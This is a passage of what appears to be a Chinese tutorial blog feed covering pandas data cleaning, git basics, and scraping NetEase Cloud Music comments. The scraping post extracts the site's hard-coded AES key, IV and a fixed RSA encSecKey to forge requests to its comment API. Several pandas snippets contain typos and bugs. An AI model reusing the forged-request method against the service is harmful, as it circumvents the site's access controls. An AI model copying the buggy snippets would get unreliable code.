        <content type="html"><![CDATA[<h1 id="数据分析—-数据清洗"><a href="#数据分析—-数据清洗" class="headerlink" title="数据分析—-数据清洗"></a>数据分析—-数据清洗</h1><h2 id="一、导入数据"><a href="#一、导入数据" class="headerlink" title="一、导入数据"></a>一、导入数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> Series,DataFrame</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = DataFrame(pd.read_excel(<span class="string">'datas/grades.xlsx'</span>)) </span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure><pre><code>   Unnamed: 0  Unnamed: 1  Unnamed: 2  Unnamed: 30         蒋广佳        43.0        69.0        61.01          廖菲        80.0        64.0        62.02         沈秀玲        68.0        74.0        98.03          韦丹        48.0        53.0        64.04         张梦雅        72.0        73.0        96.05         赵雅欣        60.0         NaN        70.06         曹海广        74.0        60.0        20.07         陈泽灿        38.0        21.0        92.08         NaN        88.0        67.0        84.09         高海亮        86.0        74.0        96.010        顾晓冬        84.0        60.0        90.011        侯星宇        64.0       111.0         NaN12        江宜哲        60.0        33.0        70.013        NaN         NaN         NaN         NaN14        梁杨杨        68.0        54.0        94.015         刘辉         NaN        63.0        98.016        罗嘉豪        39.0        44.0        56.017        施亚君        90.0        63.0        90.018         孙添        64.0        63.0        78.019         王杰        74.0         NaN        76.020         王泽        52.0        48.0        94.021        NaN        60.0        69.0        74.022        杨福程        70.0        49.0        76.023        尤澳晨        91.0        67.0        86.024         翟佳        78.0        73.0        88.025         张旭       100.0        60.0        98.026        支星哲        80.0        63.0       100.027        邹湘涛        54.0        40.0        90.0</code></pre><ul><li>我们可以看见上面的数据是缺少标注的，列名缺少标注；并且有很多是空值，因此我们要对数据进行清洗，提高数据的质量。在这里数据清洗有四个要点简称“完全合一”<ul><li><strong>完</strong>整性：单条数据是否完整，统计的字段是否完善。</li><li><strong>全</strong>面性：观察某一列的全部数值，选中一列，我们可以看到最大值，最小值，平均值。我们可以通过常识判断数据是否合理，比如：数据定义、单位标识、数值本身。</li><li><strong>合</strong>法性：数据的类型、内容、大小的合法性。比如数据中存在非ASCII字符，性别存在未知，总分超过100等。</li><li>唯<strong>一</strong>性：数据是否存在重复记录，由于数据来源于不同的渠道，重复的情况是非常常见的。行数据、列数据都需要是唯一的。</li></ul></li><li>事实上数据清洗的标准有差不多七八条，有兴趣的可以了解一下，这里归纳为“完全合一”四条，按照这四条基本上可以解决数据清洗中的大部分问题，使得数据<strong>标准、干净、连续</strong>。</li></ul><h2 id="二、开始数据清洗"><a href="#二、开始数据清洗" class="headerlink" title="二、开始数据清洗"></a>二、开始数据清洗</h2><h3 id="1、完整性"><a href="#1、完整性" class="headerlink" title="1、完整性"></a>1、完整性</h3><h3 id="problem-1-空行"><a href="#problem-1-空行" class="headerlink" title="problem 1:空行"></a>problem 1:空行</h3><ul><li>solution: 删除</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.dropna(how=<span class="string">"all"</span>,inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h3 id="problem-2-缺失值"><a href="#problem-2-缺失值" class="headerlink" title="problem 2:缺失值"></a>problem 2:缺失值</h3><ul><li>solution：<ul><li>删除：删除数据缺失的记录</li><li>均值：使用当前列的均值</li><li>高频：使用当前列出现平率最高的数据</li></ul></li><li>首先我们先把列的标注补上</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df = df.rename(columns=&#123;<span class="string">'Unnamed: 0'</span>:<span class="string">'index'</span>,<span class="string">'Unnamed: 1'</span>:<span class="string">'math'</span>,<span class="string">'Unnamed: 2'</span>:<span class="string">'english'</span>,<span class="string">'Unnamed: 3'</span>:<span class="string">'c++'</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df = df.drop(columns=<span class="string">'index'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df)</span><br></pre></td></tr></table></figure><pre><code>     math  english    c++0    43.0     69.0   61.01    80.0     64.0   62.02    68.0     74.0   98.03    48.0     53.0   64.04    72.0     73.0   96.05    60.0      NaN   70.06    74.0     60.0   20.07    38.0     21.0   92.08    88.0     67.0   84.09    86.0     74.0   96.010   84.0     60.0   90.011   64.0    111.0    NaN12   60.0     33.0   70.014   68.0     54.0   94.015    NaN     63.0   98.016   39.0     44.0   56.017   90.0     63.0   90.018   64.0     63.0   78.019   74.0      NaN   76.020   52.0     48.0   94.021   60.0     69.0   74.022   70.0     49.0   76.023   91.0     67.0   86.024   78.0     73.0   88.025  100.0     60.0   98.026   80.0     63.0  100.027   54.0     40.0   90.0</code></pre><ul><li>现在我们想对df[‘math’]中缺失的值用平均值代替</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'math'</span>].fillna(df[<span class="string">'math'</span>].mean(),inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df)</span><br></pre></td></tr></table></figure><pre><code>          math  english    c++0    43.000000     69.0   61.01    80.000000     64.0   62.02    68.000000     74.0   98.03    48.000000     53.0   64.04    72.000000     73.0   96.05    60.000000      NaN   70.06    74.000000     60.0   20.07    38.000000     21.0   92.08    88.000000     67.0   84.09    86.000000     74.0   96.010   84.000000     60.0   90.011   64.000000    111.0    NaN12   60.000000     33.0   70.013   68.653846      NaN    NaN14   68.000000     54.0   94.015   68.653846     63.0   98.016   39.000000     44.0   56.017   90.000000     63.0   90.018   64.000000     63.0   78.019   74.000000      NaN   76.020   52.000000     48.0   94.021   60.000000     69.0   74.022   70.000000     49.0   76.023   91.000000     67.0   86.024   78.000000     73.0   88.025  100.000000     60.0   98.026   80.000000     63.0  100.027   54.000000     40.0   90.0</code></pre><ul><li>如果想用最高频率的数据对english进行填充，可以通过value_counts获取math字段最高频次english_maxf,然后对其进行填充</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">english_maxf = df[<span class="string">'english'</span>].value_counts().index[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'english'</span>].fillna(english_maxf,inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(df)</span><br></pre></td></tr></table></figure><pre><code>          math  english    c++0    43.000000     69.0   61.01    80.000000     64.0   62.02    68.000000     74.0   98.03    48.000000     53.0   64.04    72.000000     73.0   96.05    60.000000     63.0   70.06    74.000000     60.0   20.07    38.000000     21.0   92.08    88.000000     67.0   84.09    86.000000     74.0   96.010   84.000000     60.0   90.011   64.000000    111.0    NaN12   60.000000     33.0   70.013   68.653846     63.0    NaN14   68.000000     54.0   94.015   68.653846     63.0   98.016   39.000000     44.0   56.017   90.000000     63.0   90.018   64.000000     63.0   78.019   74.000000     63.0   76.020   52.000000     48.0   94.021   60.000000     69.0   74.022   70.000000     49.0   76.023   91.000000     67.0   86.024   78.000000     73.0   88.025  100.000000     60.0   98.026   80.000000     63.0  100.027   54.000000     40.0   90.0</code></pre><h3 id="2、全面性"><a href="#2、全面性" class="headerlink" title="2、全面性"></a>2、全面性</h3><h3 id="problem：列数据单位不统一"><a href="#problem：列数据单位不统一" class="headerlink" title="problem：列数据单位不统一"></a>problem：列数据单位不统一</h3><p>solution：将不同的单位的找出来，将其进行迭代替换，比如说将榜（lbs）转化为千克（kgs）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 weight 数据列中单位为 lbs 的数据</span></span><br><span class="line">rows_with_lbs = df[<span class="string">'weight'</span>].str.contains(<span class="string">'lbs'</span>).fillna(<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> df[rows_with_lbs]</span><br><span class="line"><span class="comment"># 将 lbs 转换为 kgs, 2.2lbs=1kgs</span></span><br><span class="line"><span class="keyword">for</span> i,lbs_row <span class="keyword">in</span> df[rows_with_lbs].iterrows():</span><br><span class="line">    <span class="comment"># 截取从头开始到倒数第三个字符之前，即去掉 lbs。</span></span><br><span class="line">    weight = int(float(lbs_row[<span class="string">'weight'</span>][:<span class="number">-3</span>])/<span class="number">2.2</span>)</span><br><span class="line">    df.at[i,<span class="string">'weight'</span>] = <span class="string">'&#123;&#125;kgs'</span>.format(weight)</span><br></pre></td></tr></table></figure><h3 id="3、合理性"><a href="#3、合理性" class="headerlink" title="3、合理性"></a>3、合理性</h3><h3 id="problem-非ASCII字符"><a href="#problem-非ASCII字符" class="headerlink" title="problem:非ASCII字符"></a>problem:非ASCII字符</h3><p>solution:对于非ASCII字符，我们可以采用删除或者替换的方式，我们直接选择删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'name'</span>].replace(&#123;<span class="string">r'[^\x00-\x7f]+'</span>:<span class="string">''</span>&#125;,regex=<span class="keyword">True</span>,inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h3 id="4、唯一性"><a href="#4、唯一性" class="headerlink" title="4、唯一性"></a>4、唯一性</h3><h3 id="problem1：一列有多个参数"><a href="#problem1：一列有多个参数" class="headerlink" title="problem1：一列有多个参数"></a>problem1：一列有多个参数</h3><p>solution：比如英文名字，是有两部分组成的，包含两个参数Firstname、Lastnamr，我们需要将name一列拆分为Firstname和Lastname两个字段，我们可以采用split方法，对其进行切分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">'First_namr'</span>,<span class="string">'Last_name'</span>] = df[<span class="string">'name'</span>].str.split(expand=<span class="keyword">True</span>)</span><br><span class="line">df.drop(<span class="string">'name'</span>,axis=<span class="number">1</span>,inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h3 id="problem2-重读数据"><a href="#problem2-重读数据" class="headerlink" title="problem2:重读数据"></a>problem2:重读数据</h3><p>solution：我们校验数据是否存在重复数据，如果有重复数据，如果就用pandas提供的drop_duplicates()来删除重复数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.drop_duplicates([<span class="string">'First_name'</span>,<span class="string">'Last_name'</span>],inplace=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬取网易云热评并生成词云</title>
      <link href="/2019/01/12/%E7%88%AC%E5%8F%96%E7%BD%91%E6%98%93%E4%BA%91%E7%83%AD%E8%AF%84%E5%B9%B6%E7%94%9F%E6%88%90%E8%AF%8D%E4%BA%91/"/>
      <url>/2019/01/12/%E7%88%AC%E5%8F%96%E7%BD%91%E6%98%93%E4%BA%91%E7%83%AD%E8%AF%84%E5%B9%B6%E7%94%9F%E6%88%90%E8%AF%8D%E4%BA%91/</url>
      
        <content type="html"><![CDATA[<h2 id="分析热评的请求URL"><a href="#分析热评的请求URL" class="headerlink" title="分析热评的请求URL"></a>分析热评的请求URL</h2><ul><li><p>首先我们先对请求抓包，发现所有的评论都包含在 <strong><a href="https://music.163.com/weapi/v1/resource/comments/R_SO_4_32785700?csrf_token=&quot;" target="_blank" rel="noopener">https://music.163.com/weapi/v1/resource/comments/R_SO_4_32785700?csrf_token=&quot;</a></strong>里面，然后再去分析这个请求，发现这是一个<strong>POST</strong>请求，请求参数由两个<strong>params</strong>以及<strong>encSecKey</strong>。好了到此我们需要的东西都有了，接下来我们分析如何去得到这两个参数。</p><h3 id="找到请求"><a href="#找到请求" class="headerlink" title="找到请求"></a>找到请求</h3><p><img src="/2019/01/12/爬取网易云热评并生成词云/1.png" alt="1.png"></p><h3 id="分析请求参数"><a href="#分析请求参数" class="headerlink" title="分析请求参数"></a>分析请求参数</h3><p><img src="/2019/01/12/爬取网易云热评并生成词云/2.png" alt="2.png"></p><h2 id="分析js加密"><a href="#分析js加密" class="headerlink" title="分析js加密"></a>分析js加密</h2></li><li>找到全局js文件，找到两个参数所在的位置<br><img src="/2019/01/12/爬取网易云热评并生成词云/3.png" alt="3.png"></li><li>发现这两个参数是由<strong>window.asrsea</strong>获得的，接着去定位到这个函数找到对应的原函数<strong>d</strong><br><img src="/2019/01/12/爬取网易云热评并生成词云/4.png" alt="4.ong"></li><li>对js进行调试，发现d的四个参数，有三个是定值，这个函数还用到了a、b、c三个函数<br><img src="/2019/01/12/爬取网易云热评并生成词云/5.png" alt="5"></li><li>其中a是产生一个16位的随机数（这里我直接让它等于<strong>FwtEYduOXlNEHbLP</strong>）为什么要等与这个呢 hhh 因为我发现这个随机数，他在生成encText的时候用了一次，生成encSecKey的时候，又用了一次，而且encSecKey就只跟这个随机数相关，所以让这个随机数为定值的话，就可以直接得到encSecKey的值，不用再去搞一个rsa加密，为了让你们看清楚，我还是把贴出来把<br><img src="/2019/01/12/爬取网易云热评并生成词云/6.png" alt="6"></li><li><strong>b</strong>函数就是我们主要要解决的<strong>AES</strong>加密，经过调试，我们可以知道它的两个参数a、b分别是加密字符转、密钥。以及AES的偏移量为<strong>0102030405060708</strong>、加密模式为<strong>CBC</strong><br><img src="/2019/01/12/爬取网易云热评并生成词云/7.png" alt="7"></li><li>接下来看c函数，c函数其实是<strong>RSA</strong>加密，获取encSecKey的值的他的三个参数，只有a是变量，是我们随机生成的16为随机数，这里我们就默认为定值，b、c应该是和rsa加密有关的参数，应为本身并没有学过加密，这里我就不多说了，但是经过调试，我们可以知道b、c是定值 <strong>b =010001</strong> c是一大串字符串。见下图。<br><img src="/2019/01/12/爬取网易云热评并生成词云/8.png" alt="8"></li><li><p>最后我们具体分析一下d函数，经过N次调试，我发现这其实和我的想法差不多，h是一个字典，包含了我们需要的两个参数。encText是由两次AES加密产生的及两次b，加密字符串是一样的，然后密钥第一次是个定值<strong>0CoJUm6Qyw8W8jud</strong>，第二次是16位随机数，也相当于定值。所以encText就出来了，params是由一次RSA加密产生的，并且只与16位的随机数有关，这里就清楚为什么我让随机数直接等于<strong>FwtEYduOXlNEHbLP</strong>，哈哈。因为我调试的时候，刚好出现了这么个随机数，于是我就直接拿过来用了，这个随机数对应的encSecKey = <strong>81e7a41af9830200d5606be1a632e57eb0006b3cdae579127115c6323d4c4802f3af9efcee21d9f4126dde266773cbd795f19ae44028f9f8d038cd62d2816952fa99bb61ecb5fba87d5b178ff4b982ee34c7491808f7cb774554a0235a210caf2e5e867a0e2ebdf6f994be1b198ab43b14ce1f7cfa6f80b9070dea5fc5d6c712</strong><br><img src="/2019/01/12/爬取网易云热评并生成词云/9.png" alt=""></p><h2 id="用python重写js加密"><a href="#用python重写js加密" class="headerlink" title="用python重写js加密"></a>用python重写js加密</h2></li><li><p>经过js加密码的分析，我用python实现了一下AES加密，具体代码如下，包含两个参数，一个是需要加密的字符串，一个是密钥具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AES_encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">   pad = <span class="number">16</span> - len(text) % <span class="number">16</span></span><br><span class="line">   text = text + pad * chr(pad)</span><br><span class="line">   encryptor = AES.new(key, AES.MODE_CBC, <span class="string">"0102030405060708"</span>)</span><br><span class="line">   encrypt_text = encryptor.encrypt(text)</span><br><span class="line">   encrypt_text = base64.b64encode(encrypt_text)</span><br><span class="line">   <span class="keyword">return</span> encrypt_text</span><br></pre></td></tr></table></figure></li><li><p>两次调用这个函数。得到结果与调试的结果对比，一模一样。哈哈，上代码、上图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f_key = <span class="string">"0CoJUm6Qyw8W8jud"</span></span><br><span class="line">text = <span class="string">"&#123;\"rid\":\"R_SO_4_32785700\",\"offset\":\"20\",\"total\":\"true\",\"limit\":\"20\",\"csrf_token\":\"\"&#125;"</span></span><br><span class="line">rs = AES_encrypt(text, f_key)</span><br><span class="line">params = AES_encrypt(str(rs)[<span class="number">2</span>:<span class="number">-1</span>], <span class="string">"FwtEYduOXlNEHbLP"</span>)</span><br></pre></td></tr></table></figure><p>这里解释一下，text是我进过N次调试得出的，因为在请求评论之前，text有好几个值来验证其他的东西，这里我大概理解了一下text的含义，这里我们只要知道offset是偏移量，limit是每次请求多少条，比如你请求前二十条则offset=0，limit = 20，我上面的是请求20-40条。<br><img src="/2019/01/12/爬取网易云热评并生成词云/10.png" alt=""><br><img src="/2019/01/12/爬取网易云热评并生成词云/11.png" alt=""></p></li><li><p>然后直接获取的encSecKey直接赋值就好啦，结合这两个参数，我们的请求参数就构造好了，直接POST吧，就能得到评论啦，哈哈，上代码，上图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> data = &#123;</span><br><span class="line">    <span class="string">'params'</span>: params,</span><br><span class="line">    <span class="string">'encSecKey'</span>: encSecKey</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Accept-Language'</span>:<span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'appver=1.5.0.75771'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://music.163.com/'</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"https://music.163.com/weapi/v1/resource/comments/R_SO_4_32785700?csrf_token="</span></span><br><span class="line">raw = requests.post(url,headers=headers, data=data)</span><br><span class="line">print(raw.json())</span><br></pre></td></tr></table></figure><p><img src="/2019/01/12/爬取网易云热评并生成词云/12.png" alt=""></p></li></ul><h2 id="解析json，获取评论"><a href="#解析json，获取评论" class="headerlink" title="解析json，获取评论"></a>解析json，获取评论</h2>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>git简单指令</title>
      <link href="/2018/12/25/git%E7%AE%80%E5%8D%95%E6%8C%87%E4%BB%A4/"/>
      <url>/2018/12/25/git%E7%AE%80%E5%8D%95%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="git简单指令"><a href="#git简单指令" class="headerlink" title="git简单指令"></a>git简单指令</h1><h2 id="首先放一张学习路线"><a href="#首先放一张学习路线" class="headerlink" title="首先放一张学习路线"></a>首先放一张学习路线</h2><p><img src="/2018/12/25/git简单指令/Git.png" alt="git学习路线"></p><h2 id="1、创建版本库"><a href="#1、创建版本库" class="headerlink" title="1、创建版本库"></a>1、创建版本库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir huzai //创建一个空目录</span><br><span class="line"><span class="built_in">cd</span> huzai  //进入此目录</span><br><span class="line">git init  //初始化git仓库</span><br></pre></td></tr></table></figure><h2 id="2、添加文件到版本库"><a href="#2、添加文件到版本库" class="headerlink" title="2、添加文件到版本库"></a>2、添加文件到版本库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add file  //将文件添加到缓存区</span><br><span class="line">git commit -m <span class="string">"post message"</span> //提交并附带提交信息</span><br></pre></td></tr></table></figure><h2 id="3、版本回退"><a href="#3、版本回退" class="headerlink" title="3、版本回退"></a>3、版本回退</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ //HEAD是一个指针，指向当前的版本,^代表上一代版本，HEAD^^代表上两代</span><br><span class="line">git reflog //查询每次提交的commit_id</span><br><span class="line">git reset --hard commit_id //根据id进行回退</span><br></pre></td></tr></table></figure><h2 id="4、管理修改"><a href="#4、管理修改" class="headerlink" title="4、管理修改"></a>4、管理修改</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD -- file //查看工作区（file）与最新版本（HEAD）的区别</span><br></pre></td></tr></table></figure><h2 id="5、撤销修改"><a href="#5、撤销修改" class="headerlink" title="5、撤销修改"></a>5、撤销修改</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- file //直接丢弃工作区的修改（可用于恢复误删的文件）</span><br><span class="line">//对于已经添加到缓存的修改</span><br><span class="line">git reset HEAD file //撤销缓存区的修改</span><br><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure><h2 id="6、删除文件"><a href="#6、删除文件" class="headerlink" title="6、删除文件"></a>6、删除文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm file //删除本地文件</span><br><span class="line">git rm file //删除版本库中的文件</span><br><span class="line">git commit -m <span class="string">"post delete"</span> //提交删除事务</span><br></pre></td></tr></table></figure><h2 id="7、连接远程仓库"><a href="#7、连接远程仓库" class="headerlink" title="7、连接远程仓库"></a>7、连接远程仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//先生成连接密钥</span><br><span class="line">ssh-kengen -t rsa -C username</span><br><span class="line">//将id_rsa.pub中的内容复制到github的密钥管理中</span><br><span class="line">//再根据github的提示将本地仓库与远程仓库进行关联</span><br><span class="line">git remote add origin git@github.com:username/repository</span><br><span class="line">//再推送master分支的所有内容到远程仓库</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h2 id="8、从远程仓库进行下载"><a href="#8、从远程仓库进行下载" class="headerlink" title="8、从远程仓库进行下载"></a>8、从远程仓库进行下载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:username/repository</span><br></pre></td></tr></table></figure><h2 id="9、创建新的分支并切换到该分支下"><a href="#9、创建新的分支并切换到该分支下" class="headerlink" title="9、创建新的分支并切换到该分支下"></a>9、创建新的分支并切换到该分支下</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b branchname //创建并切换</span><br><span class="line">git branch branch_name //创建</span><br><span class="line">git checkout branch_name //切换</span><br></pre></td></tr></table></figure><h2 id="10、合并指定分支到当前分支"><a href="#10、合并指定分支到当前分支" class="headerlink" title="10、合并指定分支到当前分支"></a>10、合并指定分支到当前分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge branch_name</span><br></pre></td></tr></table></figure><h2 id="11、删除分支"><a href="#11、删除分支" class="headerlink" title="11、删除分支"></a>11、删除分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d branch_name</span><br></pre></td></tr></table></figure><h2 id="12、如果合并时出现冲突"><a href="#12、如果合并时出现冲突" class="headerlink" title="12、如果合并时出现冲突"></a>12、如果合并时出现冲突</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat conflic_filename</span><br><span class="line">//git 会用&lt;&lt;&lt;&lt;&lt; ===== &gt;&gt;&gt;&gt;&gt;&gt;显示不同分支的内容，你则需要手动解决冲突</span><br></pre></td></tr></table></figure><h2 id="13、分支管理策略"><a href="#13、分支管理策略" class="headerlink" title="13、分支管理策略"></a>13、分支管理策略</h2><p>master分支应该是非常稳定的，也就是用于发布最新版本的，平时不应该在上面干活，干活都应该在dev分支上<br>也就是说dev分支是不稳定的，到了某个时候将dev分支合并到master分支上，你和你的小伙伴应该在各自的分支上干活，然后推送到dev分支上</p><h2 id="14、bug分支"><a href="#14、bug分支" class="headerlink" title="14、bug分支"></a>14、bug分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add now_file</span><br><span class="line">git stash //保护现场</span><br><span class="line">//这里修改bug</span><br><span class="line">git stash pop //提取现场，继续工作</span><br></pre></td></tr></table></figure><h2 id="15、丢弃一个没有被合并的分支"><a href="#15、丢弃一个没有被合并的分支" class="headerlink" title="15、丢弃一个没有被合并的分支"></a>15、丢弃一个没有被合并的分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -D branch_name</span><br></pre></td></tr></table></figure><h2 id="16、多人协作"><a href="#16、多人协作" class="headerlink" title="16、多人协作"></a>16、多人协作</h2><p> 1、尝试git push origin branch_name<br> 2、如果推送失败，说明远程分支比你的版本新，则你git pull 拉取远程文件<br> 3、合并你两的分支，如果有冲突则手动解决问题<br> 4、重复1</p><ul><li>注：如果git pull 提示 no tracking information 则说明远程分支和本地分支没有关联用下面的命令进行关联<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-uostream-to branch_name origin/branch_name</span><br></pre></td></tr></table></figure></li></ul><p>或者你不知道有什么分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote -v //查看远程仓库的信息</span><br><span class="line">git checkout -b branch_name origin/branch_name //创建本地分支以及远程分支</span><br><span class="line">git branch --<span class="built_in">set</span>-upstream-to branch_name origin/branch_name //进行关联</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据分析-pandas</title>
      <link href="/2018/12/25/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-pandas/"/>
      <url>/2018/12/25/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-pandas/</url>
      
        <content type="html"><![CDATA[<h1 id="数据分析—-pandas"><a href="#数据分析—-pandas" class="headerlink" title="数据分析—-pandas"></a>数据分析—-pandas</h1><h2 id="核心数据结构-Series-amp-DataFrame"><a href="#核心数据结构-Series-amp-DataFrame" class="headerlink" title="核心数据结构 Series &amp; DataFrame"></a>核心数据结构 Series &amp; DataFrame</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pandas <span class="keyword">import</span> Series, DataFrame</span><br></pre></td></tr></table></figure><h3 id="Series是一个定长的字典序列，它有两个基本属性index-、-value-index-默认是-0-1-2-3-递增的，也可以自己指定索引-index-‘a’-‘b’-‘c’"><a href="#Series是一个定长的字典序列，它有两个基本属性index-、-value-index-默认是-0-1-2-3-递增的，也可以自己指定索引-index-‘a’-‘b’-‘c’" class="headerlink" title="Series是一个定长的字典序列，它有两个基本属性index 、 value index 默认是 0 ,1,2,3 递增的，也可以自己指定索引 index=[‘a’, ‘b’, ‘c’]"></a><strong>Series是一个定长的字典序列</strong>，它有两个基本属性<strong>index 、 value</strong> index 默认是 0 ,1,2,3 递增的，也可以自己指定索引 